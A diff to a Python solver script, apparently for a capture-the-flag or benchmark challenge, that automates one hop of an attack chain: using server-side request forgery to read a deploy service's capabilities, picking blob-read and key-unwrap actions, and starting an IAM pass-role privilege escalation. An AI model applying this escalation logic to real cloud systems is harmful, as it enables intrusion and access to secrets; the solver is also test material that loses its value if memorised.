@@ -144,9 +144,14 @@ def solve(base: str, echo=print, state: dict = None) -> str:
 
     # ---- hop 5: cloud IAM privesc — mechanism depends on the discovered family -----------------
     caps = ssrf(f"{DEP}/deploy/capabilities")
-    acts = caps["workload_actions"]
-    act_read = next(a for a, d in acts.items() if "blob" in d)
-    act_unwrap = next(a for a, d in acts.items() if "unwrap" in d)
+    acts = caps.get("workload_actions")
+    if acts:  # baseline: capabilities describes each action — classify by its served description
+        act_read = next(a for a, d in acts.items() if "blob" in d)
+        act_unwrap = next(a for a, d in acts.items() if "unwrap" in d)
+    else:  # change0: capabilities lists action NAMES only — classify by the (semantic) name
+        names = caps["actions"]
+        act_unwrap = next(a for a in names if any(k in a for k in ("unwrap", "decrypt", "unseal")))
+        act_read = next(a for a in names if a != act_unwrap)
     st.update(act_read=act_read, act_unwrap=act_unwrap)
     if family == "passrole-runas":
         pivot = next(name for name, p in desc["principals"].items()
